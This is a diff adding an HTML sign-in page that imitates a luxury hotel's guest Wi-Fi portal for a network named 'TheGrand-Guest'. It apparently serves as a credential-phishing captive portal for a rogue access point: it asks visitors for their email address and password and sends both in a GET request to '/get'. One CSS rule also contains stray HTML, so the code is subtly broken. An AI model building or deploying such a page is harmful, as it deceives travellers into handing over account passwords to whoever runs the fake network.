@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>The Grand — Guest Internet</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#0d0d0d;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:400px;background:#141414;border:1px solid #2a2a2a;border-radius:4px;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.6)}
+.top{padding:36px 32px 28px;border-bottom:1px solid #2a2a2a;text-align:center}
+.crest{font-size:28px;color:#C4A050;margin-bottom:12px;letter-spacing:8px}>✦</div>
+.hotel-name{font-size:22px;font-weight:300;color:#f0ece4;letter-spacing:6px;text-transform:uppercase}
+.hotel-sub{font-size:9px;color:#6a6050;letter-spacing:4px;text-transform:uppercase;margin-top:8px}
+.mid{background:#0f0f0f;padding:8px 32px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #2a2a2a}
+.dot{width:6px;height:6px;background:#4ade80;border-radius:50%;flex-shrink:0}
+.ssid-txt{font-size:11px;color:#4a4a4a;letter-spacing:1px}
+.ssid-txt strong{color:#6a6050;font-weight:400}
+.body{padding:32px}
+.eyebrow{font-size:9px;letter-spacing:3px;text-transform:uppercase;color:#6a6050;margin-bottom:20px}
+.lbl{display:block;font-size:9px;font-weight:400;text-transform:uppercase;letter-spacing:2px;color:#5a5040;margin-bottom:8px;margin-top:20px}
+input{width:100%;padding:12px 0;border:none;border-bottom:1px solid #2a2a2a;background:transparent;font-size:14px;color:#d0ccc0;letter-spacing:0.5px;outline:none}
+input:focus{border-bottom-color:#C4A050}
+input::placeholder{color:#2a2a2a;font-size:13px}
+.btn{width:100%;padding:14px;margin-top:28px;border:1px solid #C4A050;background:transparent;color:#C4A050;font-size:10px;font-weight:400;letter-spacing:4px;text-transform:uppercase;cursor:pointer;transition:background .2s,color .2s}
+.btn:hover{background:#C4A050;color:#0d0d0d}
+.terms{font-size:10px;color:#3a3a3a;text-align:center;margin-top:20px;line-height:1.7;letter-spacing:0.3px}
+.terms a{color:#6a6050}
+.foot{padding:16px 32px;border-top:1px solid #1e1e1e;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:9px;color:#3a3a3a;letter-spacing:1.5px;text-transform:uppercase;text-decoration:none}
+.foot a{color:#6a6050}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="top">
+    <div class="crest">✦</div>
+    <div class="hotel-name">The Grand</div>
+    <div class="hotel-sub">Complimentary Guest Internet</div>
+  </div>
+  <div class="mid"><div class="dot"></div><span class="ssid-txt">Network: <strong>TheGrand-Guest</strong></span></div>
+  <div class="body">
+    <div class="eyebrow">Please sign in to continue</div>
+    <form action="/get">
+      <label class="lbl">Email Address</label>
+      <input name="email" type="text" placeholder="your@email.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="••••••••" required>
+      <button type="submit" class="btn">Connect</button>
+      <p class="terms">By accessing our network you agree to the <a href="#">Terms of Use</a>.</p>
+    </form>
+  </div>
+  <div class="foot"><span>The Grand Hotel</span><a href="#">Concierge</a></div>
+</div>
+</body>
+</html>
